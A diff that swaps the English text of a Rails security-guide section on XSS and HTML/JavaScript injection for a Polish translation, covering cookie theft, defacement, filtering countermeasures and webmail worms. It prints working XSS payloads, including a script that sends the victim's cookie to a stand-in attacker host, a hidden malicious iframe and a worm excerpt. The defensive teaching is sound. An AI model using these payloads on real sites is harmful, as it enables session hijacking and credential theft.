@@ -705,103 +705,104 @@ W drugiej połowie 2007 r. było 88 zgłoszonych usterek w Mozilli, 22 w Safari,
  
 Stosunkowo nowymi i niecodziennymi formami punktów wejścia są banery reklamowe. We wcześniejszych miesiącach 2008 roku, złośliwy kod ukazał się w reklamach w formie baneru na popularnych witrynach, takich jak MySpace i Excite, zgodnie z http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/[Trend Micro]. 
 
-==== HTML/JavaScript Injection
+==== Ataki HTML/JavaScript Injection
 
-The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. [,#fffcdb]#Escaping user input is essential#.
-
-Here is the most straightforward test to check for XSS:
-
+Najczęściej stosowanym językiem dla XSS jest oczywiście najbardziej popularny język wykonywany po stronie klienta - JavaScript, często w połączeniu z HTML. [,#fffcdb]#Unikanie wejścia użytkownika jest niezbędne#. 
+ 
+Oto najprostszy test, aby sprawdzić XSS: 
+ 
 ..........
 <script>alert('Hello');</script>
 ..........
 
-This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
+Ten kod JavaScript po prostu wyświetli alert box. Kolejne przykłady robią dokładnie to samo, tylko w bardzo nietypowych miejscach:
 
 ..........
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
 ..........
+ 
+===== Kradzież cookie 
 
-===== Cookie theft
-
-These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
-
+Te przykłady, jak na razie nie robią żadnej szkody, więc zobaczmy w jaki sposób atakujący może wykraść cookies użytkownika (i tym samym przejąć sesję użytkownika). W JavaScript można użyć właściwość document.cookie do odczytu i zapisu cookies. JavaScript egzekwuje the same origin policy, co oznacza, że skrypt z jednej domeny nie może uzyskać dostępu do cookies z innej domeny. We właściwości document.cookie posiada cookie pochodzące z serwera WWW. Jednakże, możesz odczytywać i zapisywać tą wartość, jeśli umieścisz kod bezpośrednio w dokumencie HTML (jak to się dzieje w XSS). Umieść to gdziekolwiek na swojej stronie w celu sprawdzenia własnych cookies na stronie wyników: 
+ 
 ..........
 <script>document.write(document.cookie);</script>
 ..........
 
-For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.
-
+Dla atakujący, oczywiście, nie jest to przydatne, ponieważ ofiara zobaczy swoje własne cookie. W następnym przykładzie spróbujemy załadować obrazek z adresu http://www.attacker.com/ plus cookie. Oczywiście ten adres nie istnieje, więc przeglądarka nic nie wyświetli. Ale atakujący może dokonać przeglądu raportu dostępu do jego serwera, żeby sprawdzić cookie ofiar. 
+ 
 ..........
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
 ..........
 
-The log files on www.attacker.com will read like this:
-
+Raprt na www.attacker.com będzie wyglądać tak:
+ 
 ..........
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ..........
 
-You can mitigate these attacks (in the obvious way) by adding the http://dev.rubyonrails.org/ticket/8895[httpOnly] flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/[will still be visible using Ajax], though.
+Możesz zmniejszyć te ataki (w sposób oczywisty) poprzez dodanie flagi http://dev.rubyonrails.org/ticket/8895 [httpOnly] cookies, żeby document.cookie nie mógł być odczytany przez JavaScript. Cookies httpOnly mogą być używane pod IE v6.SP1, Firefoxoxem v2.0.0.5 i Operą 9.5. Safari nadal ignoruje tą opcję. Ale w innych, starszych przeglądarkach (np. WebTV i IE 5.5 na Macu) może to powodować problemy z ładowaniem się stron. Ostrzegamy, że pliki cookie http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/[nadal będą widoczne przy użyciu technologii Ajax].
+ 
+===== Atak typu Defacement
 
-===== Defacement
-
-With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:
+Poprzez atak typu defacment atakujący może zrobić wiele rzeczy, na przykład przedstawiać fałszywe informacje lub wabić ofiary na swoją stronę internetową, żeby wykraść cookies, dane logowania lub innych wrażliwe dane. Najbardziej popularnym sposobem jest wstawienie kodu z zewnętrznych źródeł przez iframes: 
 
 ..........
 <iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
 ..........
 
-This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html[actual attack] on legitimate Italian sites using the http://isc.sans.org/diary.html?storyid=3015[Mpack attack framework]. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.
+Powyższy kod załaduje arbitralny kod HTML i/lub JavaScript z zewnętrznego źródła i osadzi go jako część witryny. Ten IFrame pochodzi z  http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html[rzeczywistego ataku] prawnych Włoskich stron przy użyciu http://isc.sans.org/diary.html?storyid=3015[frameworku ataku MPack]. MPack próbuje zainstalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej - jest bardzo skuteczny, 50% ataków kończy się sukcesem.
 
-A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
-
-Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
-
+Bardziej specjalistyczne ataki mogą pokrywać całą stronę internetową lub wyświetlać formularz logowania, który wygląda tak samo jak oryginalny, lecz przekazuje nazwę użytkownika i hasło na stronę atakującego. Może też używać CSS i/lub JavaScript do ukrycia ważnych linków w aplikacji internetowej i wyświetlać inne, który przekierowywują do fałszywej strony internetowej. 
+ 
+Odbite ataki typu injection to te, w których ładunek nie jest trzymany do przedstawienia go ofiarze później, ale zawarty w adresie URL. Zwłaszcza formularze wyszukiwania nie mogą uniknąć wyszukiwania ciągu znaków. Następujący link przedstawiła stronę, która stwierdziła, że "George Bush powołał 9-letniego chłopca na przewodniczącego ...":
+ 
 ..........
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
 ..........
+ 
+===== Sposoby ochrony
 
-===== Countermeasures
+[,#fffcdb]#Bardzo ważne jest filtrowanie złośliwego wejścia, ale równie ważne jest uniknięcie wyjście w aplikacjach internetowych#.
+ 
+W szczególności dla XSS, ważne jest, aby zrobić [,#fffcdb]#białą listę filtrowania wejścia zamiast czarnej#. Biała lista filtrowania określa dozwolone wartości w przeciwieństwie do wartości niedozwolonych. Czarne listy nigdy nie są kompletne.
 
-[,#fffcdb]#It is very important to filter malicious input, but it is also important to escape the output of the web application#.
-
-Especially for XSS, it is important to do [,#fffcdb]#whitelist input filtering instead of blacklist#. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.
-
-Imagine a blacklist deletes “script” from the user input. Now the attacker injects “<scrscriptipt>”, and after the filter, “<script>” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
-
+Wyobraź sobie, że czarna lista usuwa "skrypt" z wejścia użytkownika. Teraz atakujący wprowadza "<scrscriptipt>", a po przefiltrowaniu pozostaje "<script>". Wcześniejsze wersje Railsów używały czarnej listy do metod strip_tags(), strip_links() i sanitize(). Więc tego typu atak był możliwy:
+ 
 ...........
 strip_tags("some<<b>script>alert('hello')<</b>/script>") 
 ...........
-
-This returned "some<script>alert('hello')</script>", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():
-
+ 
+Zwróciło to "some<script>alert('hello')</script>", co sprawiło, że atak zadziałał. To jest powód dla którego byłem za wprowadzeniem białych list przy aktualizacji metody sanitize() w Railsach 2.
+ 
 ...........
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
 ...........
 
-This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
+Pozwala to tylko na używanie niektórych tagów i odwala dobrą robotę, nawet przeciw wszelkiego rodzaju sztuczkom i zniekształconym tagom. 
+   
+W drugim etapie, [,#fffcdb]#dobrą praktyką jest unikanie wszystkich wyjść aplikacji#, zwłaszcza gdy ponownie wyświetlane jest wejście użytkownika, które nie zostało przefiltrowane (jak we wcześniej wspomnianym przykładzie formularza wyszukiwania). [,#fffcdb]#Używaj metody escapeHTML() (lub jej aliasu h())# żeby zastąpić znaki wejścia HTML &,",<,> przez ich nieinterpretowane reprezentacje w formacie HTML (&amp;, &quot;, &lt; and &gt;). Jednak może się zdarzyć, że programatora zapomni ich użyć, więc [,#fffcdb]#zaleca się korzystanie z http://safe-erb.rubyforge.org/svn/plugins/safe_erb/[wtyczki SafeErb]#. SafeErb przypomina o unikaniu ciągów znaków z zewnętrznych źródeł.
+  
+===== Zaciemnianie i ataki z wykorzystaniem kodowania znaków
 
-As a second step, [,#fffcdb]#it is good practice to escape all output of the application#, especially when re-displaying user input, which hasn't been input filtered (as in the search form example earlier on). [,#fffcdb]#Use escapeHTML() (or its alias h()) method# to replace the HTML input characters &,",<,> by its uninterpreted representations in HTML (&amp;, &quot;, &lt; and &gt;). However, it can easily happen that the programmer forgets to use it, so [,#fffcdb]#it is recommended to use the http://safe-erb.rubyforge.org/svn/plugins/safe_erb/[SafeErb] plugin#. SafeErb reminds you to escape strings from external sources.
-
-===== Obfuscation and Encoding Injection
-
-Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
+Ruch w sieci opiera się głównie na ograniczonym zachodnim alfabecie, więc nowe kodowanie znaków, np. Unicode, pojawiły się, w celu przekazywania znaków w innych językach. Ale jest to również zagrożenie dla aplikacji internetowych, ponieważ złośliwy kod może być ukryty w różnych kodowaniach, z którymi przeglądarka internetowa może sobie poradzić, a aplikacja internetowa nie może. Oto wektor ataku w kodowaniu UTF-8:
 
 ............
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ............
 
-This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php[Hackvertor]. Rails‘ sanitize() method does a good job to fend off encoding attacks.
+Działaniem tego przykładu jest wyskakujące okno komunikatu. Będzie to rozpoznawane przez wyżej wspomniany filtr sanitize(). Świetnym narzędziem do zaciemniania i kodowania ciągów znaków, a tym samym "do poznania swjego wroga", jest http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php [Hackvertor]. Railsowa metoda sanitize() odwala dobrą robotę odpierając ataki z wykorzystaniem kodowania znaków. 
 
-==== Examples from the underground
+ 
+==== Podziemne przykłady
+ 
+-- _ Aby zrozumieć dzisiejsze ataki na aplikacje internetowe, najlepiej spojrzeć na niektóre wektory ataków w świecie rzeczywistym._ 
 
--- _In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
-
-The following is an excerpt from the http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1[Js.Yamanner@m] Yahoo! Mail http://groovin.net/stuff/yammer.txt[worm]. It appeared on June 11, 2006 and was the first webmail interface worm:
+Poniżej znajduje się wyciąg z http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1[Js.Yamanner@m] Yahoo! Mail http://groovin.net/stuff/yammer.txt[worm]. Ukazał się 11 czerwca 2006 roku i był pierwszym robakiem w mailowym interfejsie: 
 
 ...........
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
@@ -809,13 +810,13 @@ The following is an excerpt from the http://www.symantec.com/security_response/w
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
 ...........
 
-The worms exploits a hole in Yahoo's HTML/JavaScript filter, it usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
+Robak wykorzystuje dziurę w filtrze HTML/JavaScript Yahoo. Zazwyczaj filtruje on wszystkie cele i atrybuty onload z tagów (ponieważ nie można używać JavaScriptu). Filtr jest stosowany tylko raz, jednak w taki sposób, że atrybuty onload z zainfekowanym kodem pozostają w miejscu. Jest to dobry przykład tego, że filtry tworzone za pomocą czarnych list nigdy nie są kompletne i dlaczego trudno jest pozwolić na HTML/JavaScript w aplikacji internetowej. 
 
-Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details and a video demonstration on http://rosario.valotta.googlepages.com/home[Rosario Valotta's website]. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
+Kolejnym dowodem koncepcji robaka webmailowego jest Nduja, robak typu cross-domain na cztery włoskie usługi webmailowe. Więcej szczegółów i demonstracja wideo znajduje się na stronie http://rosario.valotta.googlepages.com/home [Rosario Valotta]. Oba webmailowe robaki mają na celu zbieranie adresów e-mail, czyli coś, za co haker może zarobić duże pieniądze. 
 
-In December 2006, 34,000 actual user names and passwords were stolen in a http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html[MySpace phishing attack]. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
-
-The MySpace Samy worm will be discussed in the CSS Injection section.
+W grudniu 2006 roku, 34000 rzeczywistych nazw użytkownika i haseł zostały skradzione z http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html [MySpace poprzez atak typu phishing]. Ideą ataku było stworzenie strony profilu o nazwie "login_home_index_html", a więc adres wyglądał bardzo przekonująco. Specjalnie spreparowany HTML i CSS został użyty w celu ukrycia prawdziwej treści ze strony MySpace i zamiast tego wyświetlał własny formularz logowania. 
+ 
+Robak Samy z MySpace zostanie omówiony w sekcji o atakach typu CSS injection. 
 
 === CSS Injection
 
